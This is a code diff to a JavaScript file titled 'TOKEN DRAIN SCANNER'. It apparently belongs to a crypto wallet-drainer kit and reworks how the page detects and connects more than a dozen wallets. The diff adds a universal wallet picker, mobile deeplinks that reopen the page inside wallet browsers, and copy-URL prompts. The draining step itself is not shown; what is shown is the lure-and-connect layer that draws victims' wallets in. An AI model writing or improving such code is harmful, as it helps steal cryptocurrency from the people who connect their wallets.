@@ -1,5 +1,5 @@
 // ================================================
-// TOKEN DRAIN SCANNER - ENHANCED WALLET SUPPORT
+// TOKEN DRAIN SCANNER - FIXED WALLET CONNECTIONS
 // ================================================
 
 // Configuration
@@ -21,7 +21,7 @@ const CONFIG = {
         25: "Cronos"
     },
     
-    // Wallet configurations - UPDATED with correct deeplinks
+    // Wallet configurations - FIXED detection
     wallets: {
         metaMask: {
             name: "MetaMask",
@@ -29,7 +29,8 @@ const CONFIG = {
             color: "#f6851b",
             desktop: {
                 id: "isMetaMask",
-                download: "https://metamask.io/download/"
+                download: "https://metamask.io/download/",
+                detect: () => window.ethereum?.isMetaMask
             },
             mobile: {
                 ios: "https://metamask.app.link/dapp/",
@@ -43,7 +44,8 @@ const CONFIG = {
             color: "#3375bb",
             desktop: {
                 id: "isTrust",
-                download: "https://trustwallet.com/"
+                download: "https://trustwallet.com/",
+                detect: () => window.ethereum?.isTrust
             },
             mobile: {
                 ios: "https://link.trustwallet.com/open_url?coin_id=60&url=",
@@ -57,7 +59,8 @@ const CONFIG = {
             color: "#f0b90b",
             desktop: {
                 id: "isBinance",
-                download: "https://www.binance.com/en/download"
+                download: "https://www.binance.com/en/download",
+                detect: () => window.ethereum?.isBinance || window.BinanceChain
             },
             mobile: {
                 ios: "bnc://app.binance.com/",
@@ -71,7 +74,8 @@ const CONFIG = {
             color: "#0052ff",
             desktop: {
                 id: "isCoinbaseWallet",
-                download: "https://www.coinbase.com/wallet/downloads"
+                download: "https://www.coinbase.com/wallet/downloads",
+                detect: () => window.ethereum?.isCoinbaseWallet
             },
             mobile: {
                 ios: "cbwallet://",
@@ -85,7 +89,8 @@ const CONFIG = {
             color: "#ab9ff2",
             desktop: {
                 id: "isPhantom",
-                download: "https://phantom.app/"
+                download: "https://phantom.app/",
+                detect: () => window.ethereum?.isPhantom
             },
             mobile: {
                 ios: "phantom://",
@@ -99,7 +104,8 @@ const CONFIG = {
             color: "#1d1534",
             desktop: {
                 id: "isExodus",
-                download: "https://www.exodus.com/download/"
+                download: "https://www.exodus.com/download/",
+                detect: () => window.ethereum?.isExodus || window.exodus?.ethereum
             },
             mobile: {
                 ios: "exodus://",
@@ -113,7 +119,8 @@ const CONFIG = {
             color: "#000000",
             desktop: {
                 id: "isOkxWallet",
-                download: "https://www.okx.com/download"
+                download: "https://www.okx.com/download",
+                detect: () => window.ethereum?.isOkxWallet
             },
             mobile: {
                 ios: "okx://",
@@ -127,7 +134,8 @@ const CONFIG = {
             color: "#2980ff",
             desktop: {
                 id: "isTokenPocket",
-                download: "https://tokenpocket.pro/"
+                download: "https://tokenpocket.pro/",
+                detect: () => window.ethereum?.isTokenPocket
             },
             mobile: {
                 ios: "tpoutside://",
@@ -141,7 +149,8 @@ const CONFIG = {
             color: "#4c6fff",
             desktop: {
                 id: "isSafePal",
-                download: "https://www.safepal.com/download"
+                download: "https://www.safepal.com/download",
+                detect: () => window.ethereum?.isSafePal
             },
             mobile: {
                 ios: "safepal://",
@@ -155,7 +164,8 @@ const CONFIG = {
             color: "#ff875b",
             desktop: {
                 id: "isArgent",
-                download: "https://www.argent.xyz/"
+                download: "https://www.argent.xyz/",
+                detect: () => window.ethereum?.isArgent
             },
             mobile: {
                 ios: "argent://",
@@ -169,7 +179,8 @@ const CONFIG = {
             color: "#001e59",
             desktop: {
                 id: "isRainbow",
-                download: "https://rainbow.me/"
+                download: "https://rainbow.me/",
+                detect: () => window.ethereum?.isRainbow
             },
             mobile: {
                 ios: "rainbow://",
@@ -177,32 +188,34 @@ const CONFIG = {
                 universal: "https://rainbow.me/"
             }
         },
-        zengo: {
-            name: "Zengo",
-            icon: "🛡️",
-            color: "#000000",
+        walletConnect: {
+            name: "WalletConnect",
+            icon: "🔗",
+            color: "#3b99fc",
             desktop: {
-                id: "isZengo",
-                download: "https://zengo.com/"
+                id: "isWalletConnect",
+                download: "https://walletconnect.com/",
+                detect: () => window.WalletConnect || window.walletConnect
             },
             mobile: {
-                ios: "zengo://",
-                android: "zengo://",
-                universal: "https://zengo.com/"
+                ios: "wc://",
+                android: "wc://",
+                universal: "https://walletconnect.com/"
             }
         },
-        ledger: {
-            name: "Ledger Live",
-            icon: "🔒",
-            color: "#000000",
+        brave: {
+            name: "Brave Wallet",
+            icon: "🦁",
+            color: "#fb542b",
             desktop: {
-                id: "isLedger",
-                download: "https://www.ledger.com/ledger-live"
+                id: "isBraveWallet",
+                download: "https://brave.com/wallet/",
+                detect: () => window.ethereum?.isBraveWallet
             },
             mobile: {
-                ios: "ledgerlive://",
-                android: "ledgerlive://",
-                universal: "https://www.ledger.com/ledger-live"
+                ios: "brave://",
+                android: "brave://",
+                universal: "https://brave.com/wallet/"
             }
         }
     }
@@ -311,35 +324,46 @@ async function checkExistingConnection() {
     }
 }
 
-// Get Ethereum provider - ENHANCED DETECTION
+// Get Ethereum provider - IMPROVED DETECTION
 function getEthereum() {
-    // Check for various wallet providers
-    const providers = [
-        { name: 'metaMask', check: () => window.ethereum?.isMetaMask, provider: window.ethereum },
-        { name: 'trust', check: () => window.ethereum?.isTrust, provider: window.ethereum },
-        { name: 'binance', check: () => window.ethereum?.isBinance || window.BinanceChain, provider: window.ethereum || window.BinanceChain },
-        { name: 'coinbase', check: () => window.ethereum?.isCoinbaseWallet, provider: window.ethereum },
-        { name: 'phantom', check: () => window.ethereum?.isPhantom, provider: window.ethereum },
-        { name: 'okx', check: () => window.ethereum?.isOkxWallet, provider: window.ethereum },
-        { name: 'tokenPocket', check: () => window.ethereum?.isTokenPocket, provider: window.ethereum },
-        { name: 'exodus', check: () => window.ethereum?.isExodus, provider: window.ethereum },
-        { name: 'rainbow', check: () => window.ethereum?.isRainbow, provider: window.ethereum },
-        { name: 'argent', check: () => window.ethereum?.isArgent, provider: window.ethereum },
-        { name: 'safePal', check: () => window.ethereum?.isSafePal, provider: window.ethereum },
-        { name: 'zengo', check: () => window.ethereum?.isZengo, provider: window.ethereum },
-        { name: 'ledger', check: () => window.ethereum?.isLedger, provider: window.ethereum },
-        { name: 'generic', check: () => window.ethereum, provider: window.ethereum }
-    ];
+    // First check if any wallet is detected
+    const detectedWallet = detectWallet();
     
-    for (const providerInfo of providers) {
-        if (providerInfo.check()) {
-            walletProvider = providerInfo.name;
-            console.log(`✅ Detected wallet: ${providerInfo.name}`);
-            return providerInfo.provider;
-        }
+    if (detectedWallet && detectedWallet.provider) {
+        walletProvider = detectedWallet.key;
+        console.log(`✅ Detected wallet: ${detectedWallet.name}`);
+        return detectedWallet.provider;
+    }
+    
+    // If no specific wallet detected but window.ethereum exists
+    if (window.ethereum) {
+        walletProvider = 'unknown';
+        console.log('⚠️ Generic Ethereum provider detected');
+        return window.ethereum;
     }
     
     console.log('❌ No wallet provider found');
+    return null;
+}
+
+// Detect which wallet is active
+function detectWallet() {
+    const allWallets = CONFIG.wallets;
+    
+    for (const [key, wallet] of Object.entries(allWallets)) {
+        try {
+            if (wallet.desktop.detect && wallet.desktop.detect()) {
+                return {
+                    key,
+                    name: wallet.name,
+                    provider: window.ethereum || window.BinanceChain || window.exodus?.ethereum
+                };
+            }
+        } catch (error) {
+            console.log(`⚠️ Error detecting ${wallet.name}:`, error.message);
+        }
+    }
+    
     return null;
 }
 
@@ -352,69 +376,15 @@ async function handleConnect() {
         return;
     }
     
-    // On mobile, check if we're in a wallet browser
-    if (isMobile) {
-        await handleMobileConnect();
-        return;
-    }
-    
-    // On desktop, show enhanced wallet selector
-    await handleDesktopConnect();
+    // Show universal wallet selector (same for mobile and desktop)
+    showUniversalWalletSelector();
 }
 
-// Handle desktop connection with enhanced selector
-async function handleDesktopConnect() {
-    // Detect available wallets
-    const availableWallets = detectAvailableWallets();
+// Show universal wallet selector (works on both mobile and desktop)
+function showUniversalWalletSelector() {
+    // Get popular wallets for the platform
+    const popularWallets = getPopularWallets();
     
-    if (availableWallets.length === 0) {
-        updateStatus('❌ No wallet found!');
-        showWalletInstallGuide();
-        return;
-    }
-    
-    // Show enhanced wallet selector
-    showEnhancedWalletSelector(availableWallets);
-}
-
-// Detect available wallets on desktop
-function detectAvailableWallets() {
-    const wallets = [];
-    const allWallets = CONFIG.wallets;
-    
-    Object.entries(allWallets).forEach(([key, wallet]) => {
-        const walletCheck = {
-            'metaMask': () => window.ethereum?.isMetaMask,
-            'trust': () => window.ethereum?.isTrust,
-            'binance': () => window.ethereum?.isBinance || window.BinanceChain,
-            'coinbase': () => window.ethereum?.isCoinbaseWallet,
-            'phantom': () => window.ethereum?.isPhantom,
-            'exodus': () => window.ethereum?.isExodus,
-            'okx': () => window.ethereum?.isOkxWallet,
-            'tokenPocket': () => window.ethereum?.isTokenPocket,
-            'safePal': () => window.ethereum?.isSafePal,
-            'argent': () => window.ethereum?.isArgent,
-            'rainbow': () => window.ethereum?.isRainbow,
-            'zengo': () => window.ethereum?.isZengo,
-            'ledger': () => window.ethereum?.isLedger
-        };
-        
-        if (walletCheck[key] && walletCheck[key]()) {
-            wallets.push({ 
-                key, 
-                name: wallet.name, 
-                icon: wallet.icon, 
-                color: wallet.color 
-            });
-        }
-    });
-    
-    console.log('📋 Available wallets:', wallets.map(w => w.name));
-    return wallets;
-}
-
-// Show enhanced wallet selector (AppKit style)
-function showEnhancedWalletSelector(wallets) {
     const selectorHTML = `
         <div class="wallet-selector-overlay">
             <div class="wallet-selector-modal">
@@ -425,12 +395,12 @@ function showEnhancedWalletSelector(wallets) {
                 <p class="modal-subtitle">Choose your preferred wallet to continue</p>
                 
                 <div class="wallet-grid">
-                    ${wallets.map(wallet => `
-                        <button class="wallet-card" onclick="selectWallet('${wallet.key}')" style="--wallet-color: ${wallet.color}">
+                    ${popularWallets.map(wallet => `
+                        <button class="wallet-card" onclick="handleWalletSelection('${wallet.key}')" style="--wallet-color: ${wallet.color}">
                             <div class="wallet-icon">${wallet.icon}</div>
                             <div class="wallet-info">
                                 <span class="wallet-name">${wallet.name}</span>
-                                <span class="wallet-status">Detected</span>
+                                <span class="wallet-status">${wallet.installed ? 'Detected' : 'Not Installed'}</span>
                             </div>
                             <div class="arrow">→</div>
                         </button>
@@ -460,12 +430,32 @@ function showEnhancedWalletSelector(wallets) {
     selector.innerHTML = selectorHTML;
     document.body.appendChild(selector);
     
-    // Add CSS for enhanced selector
-    addEnhancedSelectorStyles();
+    // Add CSS for universal selector
+    addUniversalSelectorStyles();
 }
 
-// Add CSS for enhanced wallet selector
-function addEnhancedSelectorStyles() {
+// Get popular wallets based on platform
+function getPopularWallets() {
+    const popularKeys = isMobile 
+        ? ['metaMask', 'trust', 'coinbase', 'binance', 'phantom', 'exodus', 'okx']
+        : ['metaMask', 'trust', 'coinbase', 'binance', 'phantom', 'exodus', 'okx', 'tokenPocket', 'brave'];
+    
+    return popularKeys.map(key => {
+        const wallet = CONFIG.wallets[key];
+        if (!wallet) return null;
+        
+        return {
+            key,
+            name: wallet.name,
+            icon: wallet.icon,
+            color: wallet.color,
+            installed: wallet.desktop.detect ? wallet.desktop.detect() : false
+        };
+    }).filter(wallet => wallet !== null);
+}
+
+// Add CSS for universal wallet selector
+function addUniversalSelectorStyles() {
     const styles = `
         .wallet-selector-overlay {
             position: fixed;
@@ -480,12 +470,13 @@ function addEnhancedSelectorStyles() {
             justify-content: center;
             z-index: 9999;
             animation: fadeIn 0.3s ease;
+            padding: 20px;
         }
         
         .wallet-selector-modal {
             background: white;
             border-radius: 24px;
-            width: 90%;
+            width: 100%;
             max-width: 480px;
             max-height: 80vh;
             overflow-y: auto;
@@ -560,9 +551,17 @@ function addEnhancedSelectorStyles() {
         
         .wallet-card:hover {
             border-color: var(--wallet-color);
-            background: linear-gradient(to right, rgba(var(--wallet-color-rgb), 0.02), transparent);
+            background: #f9fafb;
             transform: translateY(-2px);
             box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+        
+        .wallet-card[data-installed="false"] {
+            opacity: 0.6;
+        }
+        
+        .wallet-card[data-installed="false"]:hover {
+            opacity: 0.8;
         }
         
         .wallet-icon {
@@ -594,6 +593,10 @@ function addEnhancedSelectorStyles() {
             font-size: 14px;
             color: #10b981;
             font-weight: 500;
+        }
+        
+        .wallet-card[data-installed="false"] .wallet-status {
+            color: #6b7280;
         }
         
         .arrow {
@@ -657,10 +660,25 @@ function addEnhancedSelectorStyles() {
             }
         }
         
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+        
+        @keyframes slideDown {
+            from {
+                opacity: 1;
+                transform: translateY(0);
+            }
+            to {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+        }
+        
         /* Mobile responsive */
         @media (max-width: 480px) {
             .wallet-selector-modal {
-                width: 95%;
                 border-radius: 20px;
             }
             
@@ -682,7 +700,6 @@ function addEnhancedSelectorStyles() {
         }
     `;
     
-    // Convert color to RGB for opacity
     const styleSheet = document.createElement('style');
     styleSheet.textContent = styles;
     document.head.appendChild(styleSheet);
@@ -701,18 +718,32 @@ function closeWalletSelector() {
     }
 }
 
-// Select wallet from selector
-async function selectWallet(walletKey) {
+// Handle wallet selection
+async function handleWalletSelection(walletKey) {
     closeWalletSelector();
     walletProvider = walletKey;
-    await connectWithWallet(walletKey);
+    
+    if (isMobile) {
+        await handleMobileWalletConnection(walletKey);
+    } else {
+        await handleDesktopWalletConnection(walletKey);
+    }
 }
 
-// Connect with specific wallet
-async function connectWithWallet(walletKey) {
+// Handle desktop wallet connection
+async function handleDesktopWalletConnection(walletKey) {
     updateStatus(`🔄 Connecting with ${CONFIG.wallets[walletKey]?.name || walletKey}...`);
     
     try {
+        const wallet = CONFIG.wallets[walletKey];
+        
+        // Check if wallet is installed
+        if (!wallet.desktop.detect || !wallet.desktop.detect()) {
+            // Wallet not installed, show installation guide
+            showWalletNotInstalledModal(walletKey);
+            return;
+        }
+        
         const ethereum = getEthereum();
         if (!ethereum) {
             throw new Error('Wallet not found');
@@ -721,6 +752,12 @@ async function connectWithWallet(walletKey) {
         // Special handling for Binance Chain
         if (walletKey === 'binance' && window.BinanceChain) {
             await connectWithBinance();
+            return;
+        }
+        
+        // Special handling for Exodus
+        if (walletKey === 'exodus' && window.exodus?.ethereum) {
+            await connectWithExodus();
             return;
         }
         
@@ -758,10 +795,539 @@ async function connectWithWallet(walletKey) {
     }
 }
 
-// Connect with Binance Chain (special handling)
+// Handle mobile wallet connection
+async function handleMobileWalletConnection(walletKey) {
+    const wallet = CONFIG.wallets[walletKey];
+    
+    if (!wallet) {
+        updateStatus('❌ Wallet not supported');
+        return;
+    }
+    
+    // First check if we're already in a wallet browser
+    const ethereum = getEthereum();
+    if (ethereum) {
+        // Already in wallet browser, try to connect
+        updateStatus(`🔄 Connecting with ${wallet.name}...`);
+        
+        try {
+            const accounts = await ethereum.request({ 
+                method: 'eth_requestAccounts' 
+            });
+            
+            if (!accounts || accounts.length === 0) {
+                updateStatus('❌ User denied connection');
+                return;
+            }
+            
+            const chainIdHex = await ethereum.request({ 
+                method: 'eth_chainId' 
+            });
+            const chainId = parseInt(chainIdHex, 16);
+            
+            await handleConnected(accounts[0], chainId);
+            return;
+            
+        } catch (error) {
+            console.error('❌ Mobile connection error:', error);
+        }
+    }
+    
+    // Not in wallet browser, show mobile instructions
+    showMobileWalletInstructions(walletKey);
+}
+
+// Show mobile wallet instructions
+function showMobileWalletInstructions(walletKey) {
+    const wallet = CONFIG.wallets[walletKey];
+    if (!wallet) return;
+    
+    const currentUrl = encodeURIComponent(window.location.href);
+    let walletUrl = '';
+    
+    // Determine correct deeplink
+    if (navigator.userAgent.toLowerCase().includes('iphone') || 
+        navigator.userAgent.toLowerCase().includes('ipad')) {
+        walletUrl = wallet.mobile.ios + currentUrl;
+    } else if (navigator.userAgent.toLowerCase().includes('android')) {
+        walletUrl = wallet.mobile.android + currentUrl;
+    } else {
+        walletUrl = wallet.mobile.universal + currentUrl;
+    }
+    
+    const instructionsHTML = `
+        <div class="mobile-instructions-overlay">
+            <div class="mobile-instructions-modal">
+                <div class="modal-header">
+                    <h3>Open ${wallet.name}</h3>
+                    <button class="close-btn" onclick="closeMobileInstructions()">×</button>
+                </div>
+                
+                <div class="instructions-content">
+                    <div class="wallet-icon-large" style="background: ${wallet.color}">
+                        ${wallet.icon}
+                    </div>
+                    
+                    <h4>Follow these steps:</h4>
+                    <ol>
+                        <li>Click the button below to open ${wallet.name}</li>
+                        <li>If prompted, allow the connection</li>
+                        <li>Return to this page to continue</li>
+                    </ol>
+                    
+                    <div class="action-buttons">
+                        <a href="${walletUrl}" class="open-wallet-btn" style="background: ${wallet.color}">
+                            Open in ${wallet.name}
+                        </a>
+                        <button class="secondary-btn" onclick="showManualInstructions('${walletKey}')">
+                            Manual Instructions
+                        </button>
+                    </div>
+                    
+                    <div class="tip-box">
+                        <strong>💡 Tip:</strong> If the app doesn't open automatically, return here and click "Manual Instructions"
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <style>
+            .mobile-instructions-overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: rgba(0, 0, 0, 0.8);
+                backdrop-filter: blur(10px);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 10000;
+                padding: 20px;
+                animation: fadeIn 0.3s ease;
+            }
+            
+            .mobile-instructions-modal {
+                background: white;
+                border-radius: 24px;
+                width: 100%;
+                max-width: 480px;
+                max-height: 80vh;
+                overflow-y: auto;
+                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+                animation: slideUp 0.4s ease;
+            }
+            
+            .instructions-content {
+                padding: 32px;
+                text-align: center;
+            }
+            
+            .wallet-icon-large {
+                font-size: 64px;
+                width: 100px;
+                height: 100px;
+                border-radius: 24px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                color: white;
+                margin: 0 auto 30px;
+            }
+            
+            .instructions-content h4 {
+                margin: 0 0 20px;
+                color: #111827;
+                font-size: 20px;
+            }
+            
+            .instructions-content ol {
+                text-align: left;
+                margin: 0 0 30px;
+                padding-left: 20px;
+            }
+            
+            .instructions-content li {
+                margin: 10px 0;
+                color: #374151;
+                font-size: 16px;
+            }
+            
+            .action-buttons {
+                display: flex;
+                flex-direction: column;
+                gap: 12px;
+                margin: 0 0 20px;
+            }
+            
+            .open-wallet-btn {
+                padding: 18px;
+                border-radius: 16px;
+                color: white;
+                text-decoration: none;
+                font-weight: 600;
+                font-size: 17px;
+                transition: all 0.2s;
+            }
+            
+            .open-wallet-btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            }
+            
+            .secondary-btn {
+                padding: 16px;
+                border-radius: 16px;
+                background: #f3f4f6;
+                border: 2px solid #e5e7eb;
+                color: #374151;
+                font-weight: 600;
+                font-size: 16px;
+                cursor: pointer;
+                transition: all 0.2s;
+            }
+            
+            .secondary-btn:hover {
+                background: #e5e7eb;
+            }
+            
+            .tip-box {
+                background: #f0f9ff;
+                border: 2px solid #bae6fd;
+                border-radius: 12px;
+                padding: 16px;
+                color: #0369a1;
+                font-size: 14px;
+                text-align: left;
+                margin-top: 20px;
+            }
+        </style>
+    `;
+    
+    const instructions = document.createElement('div');
+    instructions.innerHTML = instructionsHTML;
+    document.body.appendChild(instructions);
+}
+
+// Show manual instructions
+function showManualInstructions(walletKey) {
+    const wallet = CONFIG.wallets[walletKey];
+    if (!wallet) return;
+    
+    const manualHTML = `
+        <div class="manual-instructions-overlay">
+            <div class="manual-instructions-modal">
+                <div class="modal-header">
+                    <h3>Manual Setup for ${wallet.name}</h3>
+                    <button class="close-btn" onclick="closeManualInstructions()">×</button>
+                </div>
+                
+                <div class="manual-content">
+                    <h4>Follow these steps:</h4>
+                    <ol>
+                        <li>Open ${wallet.name} app on your device</li>
+                        <li>Go to the browser/DApps section</li>
+                        <li>Copy and paste this URL:</li>
+                    </ol>
+                    
+                    <div class="url-container">
+                        <input type="text" readonly value="${window.location.href}" id="manualUrlInput">
+                        <button onclick="copyManualUrl()" class="copy-btn">
+                            Copy
+                        </button>
+                    </div>
+                    
+                    <div class="actions">
+                        <button class="primary-btn" onclick="closeManualInstructions()">
+                            I've Connected
+                        </button>
+                        <button class="secondary-btn" onclick="showMobileWalletInstructions('${walletKey}')">
+                            Back
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <style>
+            .manual-instructions-overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: rgba(0, 0, 0, 0.8);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 10001;
+                padding: 20px;
+            }
+            
+            .manual-instructions-modal {
+                background: white;
+                border-radius: 24px;
+                width: 100%;
+                max-width: 480px;
+                max-height: 80vh;
+                overflow-y: auto;
+                padding: 32px;
+            }
+            
+            .manual-content {
+                text-align: center;
+            }
+            
+            .manual-content h4 {
+                margin: 0 0 20px;
+                color: #111827;
+                font-size: 20px;
+            }
+            
+            .manual-content ol {
+                text-align: left;
+                margin: 0 0 30px;
+                padding-left: 20px;
+            }
+            
+            .manual-content li {
+                margin: 10px 0;
+                color: #374151;
+                font-size: 16px;
+            }
+            
+            .url-container {
+                display: flex;
+                gap: 10px;
+                margin: 0 0 30px;
+            }
+            
+            #manualUrlInput {
+                flex: 1;
+                padding: 16px;
+                border: 2px solid #e5e7eb;
+                border-radius: 12px;
+                font-size: 14px;
+                background: #f9fafb;
+            }
+            
+            .copy-btn {
+                padding: 16px 24px;
+                background: #3b82f6;
+                color: white;
+                border: none;
+                border-radius: 12px;
+                font-weight: 600;
+                cursor: pointer;
+                transition: all 0.2s;
+            }
+            
+            .copy-btn:hover {
+                background: #2563eb;
+            }
+            
+            .copy-btn.copied {
+                background: #10b981;
+            }
+            
+            .actions {
+                display: flex;
+                gap: 12px;
+            }
+            
+            .primary-btn {
+                flex: 1;
+                padding: 16px;
+                background: #3b82f6;
+                color: white;
+                border: none;
+                border-radius: 12px;
+                font-weight: 600;
+                cursor: pointer;
+            }
+            
+            .secondary-btn {
+                flex: 1;
+                padding: 16px;
+                background: #f3f4f6;
+                border: 2px solid #e5e7eb;
+                color: #374151;
+                border-radius: 12px;
+                font-weight: 600;
+                cursor: pointer;
+            }
+        </style>
+    `;
+    
+    const manual = document.createElement('div');
+    manual.innerHTML = manualHTML;
+    document.body.appendChild(manual);
+    
+    // Remove any existing instructions
+    closeMobileInstructions();
+}
+
+// Copy manual URL
+function copyManualUrl() {
+    const urlInput = document.getElementById('manualUrlInput');
+    if (urlInput) {
+        urlInput.select();
+        document.execCommand('copy');
+        
+        const copyBtn = document.querySelector('.copy-btn');
+        if (copyBtn) {
+            const originalText = copyBtn.textContent;
+            copyBtn.textContent = 'Copied!';
+            copyBtn.classList.add('copied');
+            
+            setTimeout(() => {
+                copyBtn.textContent = originalText;
+                copyBtn.classList.remove('copied');
+            }, 2000);
+        }
+    }
+}
+
+// Close mobile instructions
+function closeMobileInstructions() {
+    const instructions = document.querySelector('.mobile-instructions-overlay');
+    if (instructions) instructions.remove();
+}
+
+// Close manual instructions
+function closeManualInstructions() {
+    const manual = document.querySelector('.manual-instructions-overlay');
+    if (manual) manual.remove();
+}
+
+// Show wallet not installed modal
+function showWalletNotInstalledModal(walletKey) {
+    const wallet = CONFIG.wallets[walletKey];
+    if (!wallet) return;
+    
+    const modalHTML = `
+        <div class="not-installed-overlay">
+            <div class="not-installed-modal">
+                <div class="modal-header">
+                    <h3>${wallet.name} Not Installed</h3>
+                    <button class="close-btn" onclick="closeNotInstalledModal()">×</button>
+                </div>
+                
+                <div class="modal-content">
+                    <div class="wallet-icon-large" style="background: ${wallet.color}">
+                        ${wallet.icon}
+                    </div>
+                    
+                    <p>To connect with ${wallet.name}, you need to install it first.</p>
+                    
+                    <a href="${wallet.desktop.download}" target="_blank" class="install-btn" style="background: ${wallet.color}">
+                        Install ${wallet.name}
+                    </a>
+                    
+                    <button class="secondary-btn" onclick="closeNotInstalledModal()">
+                        Choose Another Wallet
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <style>
+            .not-installed-overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: rgba(0, 0, 0, 0.7);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 10002;
+                padding: 20px;
+            }
+            
+            .not-installed-modal {
+                background: white;
+                border-radius: 24px;
+                width: 100%;
+                max-width: 400px;
+                padding: 32px;
+                text-align: center;
+            }
+            
+            .modal-content {
+                padding: 20px 0;
+            }
+            
+            .wallet-icon-large {
+                font-size: 48px;
+                width: 80px;
+                height: 80px;
+                border-radius: 20px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                color: white;
+                margin: 0 auto 20px;
+            }
+            
+            .modal-content p {
+                color: #374151;
+                margin: 0 0 30px;
+                font-size: 16px;
+            }
+            
+            .install-btn {
+                display: block;
+                padding: 18px;
+                border-radius: 16px;
+                color: white;
+                text-decoration: none;
+                font-weight: 600;
+                font-size: 16px;
+                margin: 0 0 12px;
+                transition: all 0.2s;
+            }
+            
+            .install-btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            }
+            
+            .secondary-btn {
+                width: 100%;
+                padding: 16px;
+                border-radius: 16px;
+                background: #f3f4f6;
+                border: 2px solid #e5e7eb;
+                color: #374151;
+                font-weight: 600;
+                font-size: 16px;
+                cursor: pointer;
+                transition: all 0.2s;
+            }
+            
+            .secondary-btn:hover {
+                background: #e5e7eb;
+            }
+        </style>
+    `;
+    
+    const modal = document.createElement('div');
+    modal.innerHTML = modalHTML;
+    document.body.appendChild(modal);
+}
+
+// Close not installed modal
+function closeNotInstalledModal() {
+    const modal = document.querySelector('.not-installed-overlay');
+    if (modal) modal.remove();
+}
+
+// Connect with Binance Chain
 async function connectWithBinance() {
     try {
-        // Binance Chain uses different methods
         const accounts = await window.BinanceChain.request({ 
             method: 'eth_requestAccounts' 
         });
@@ -771,7 +1337,6 @@ async function connectWithBinance() {
             return;
         }
         
-        // Get chain ID
         const chainIdHex = await window.BinanceChain.request({ 
             method: 'eth_chainId' 
         });
@@ -785,303 +1350,30 @@ async function connectWithBinance() {
     }
 }
 
-// Handle mobile connection
-async function handleMobileConnect() {
-    // Check if we're already in a wallet browser
-    const ethereum = getEthereum();
-    if (ethereum) {
-        // Already in wallet browser, connect normally
-        await connectWithWallet(walletProvider || 'metaMask');
-        return;
-    }
-    
-    // Not in wallet browser, show mobile wallet options
-    showMobileWalletOptions();
-}
-
-// Show mobile wallet options
-function showMobileWalletOptions() {
-    const popularMobileWallets = ['metaMask', 'trust', 'coinbase', 'binance', 'phantom', 'exodus'];
-    
-    let html = `
-        <div class="mobile-wallet-connect">
-            <h3 style="margin-top: 0; color: white; text-align: center;">📱 Connect Mobile Wallet</h3>
-            <p style="color: rgba(255,255,255,0.8); text-align: center; margin-bottom: 30px;">
-                Open this dApp in your wallet's built-in browser:
-            </p>
-            <div class="mobile-wallet-grid">
-    `;
-    
-    popularMobileWallets.forEach(walletKey => {
-        const wallet = CONFIG.wallets[walletKey];
-        if (!wallet) return;
+// Connect with Exodus
+async function connectWithExodus() {
+    try {
+        // Exodus uses window.exodus.ethereum
+        const accounts = await window.exodus.ethereum.request({ 
+            method: 'eth_requestAccounts' 
+        });
         
-        const currentUrl = encodeURIComponent(window.location.href);
-        let walletUrl = '';
-        
-        // Determine correct deeplink
-        if (navigator.userAgent.toLowerCase().includes('iphone') || 
-            navigator.userAgent.toLowerCase().includes('ipad')) {
-            walletUrl = wallet.mobile.ios + currentUrl;
-        } else if (navigator.userAgent.toLowerCase().includes('android')) {
-            walletUrl = wallet.mobile.android + currentUrl;
-        } else {
-            walletUrl = wallet.mobile.universal + currentUrl;
+        if (!accounts || accounts.length === 0) {
+            updateStatus('❌ User denied connection');
+            return;
         }
         
-        // Special handling for Binance on mobile
-        if (walletKey === 'binance') {
-            walletUrl = 'https://www.binance.com/en/wallet-link?redirect=' + currentUrl;
-        }
+        const chainIdHex = await window.exodus.ethereum.request({ 
+            method: 'eth_chainId' 
+        });
+        const chainId = parseInt(chainIdHex, 16);
         
-        html += `
-            <a href="${walletUrl}" class="mobile-wallet-btn" style="background: ${wallet.color}"
-               onclick="handleMobileWalletClick('${walletKey}')">
-                <span class="mobile-wallet-icon">${wallet.icon}</span>
-                <span class="mobile-wallet-name">${wallet.name}</span>
-            </a>
-        `;
-    });
-    
-    html += `
-            </div>
-            <div class="mobile-instructions">
-                <p style="font-size: 14px; color: rgba(255,255,255,0.7); margin-top: 30px;">
-                    <strong>Tip:</strong> If the app doesn't open automatically:
-                </p>
-                <div class="manual-steps">
-                    <div class="step">1. Open your wallet app</div>
-                    <div class="step">2. Go to browser/DApps section</div>
-                    <div class="step">3. Paste this URL:</div>
-                </div>
-                <div class="url-copy-box">
-                    <input type="text" readonly value="${window.location.href}" class="url-input">
-                    <button onclick="copyMobileUrl()" class="copy-btn">Copy</button>
-                </div>
-            </div>
-        </div>
+        await handleConnected(accounts[0], chainId);
         
-        <style>
-            .mobile-wallet-connect {
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                padding: 30px 25px;
-                border-radius: 24px;
-                margin: 20px 0;
-            }
-            
-            .mobile-wallet-grid {
-                display: grid;
-                grid-template-columns: repeat(2, 1fr);
-                gap: 16px;
-            }
-            
-            .mobile-wallet-btn {
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-                justify-content: center;
-                padding: 25px 15px;
-                border-radius: 18px;
-                color: white;
-                text-decoration: none;
-                text-align: center;
-                backdrop-filter: blur(10px);
-                border: 1px solid rgba(255, 255, 255, 0.2);
-                transition: all 0.3s;
-            }
-            
-            .mobile-wallet-btn:hover {
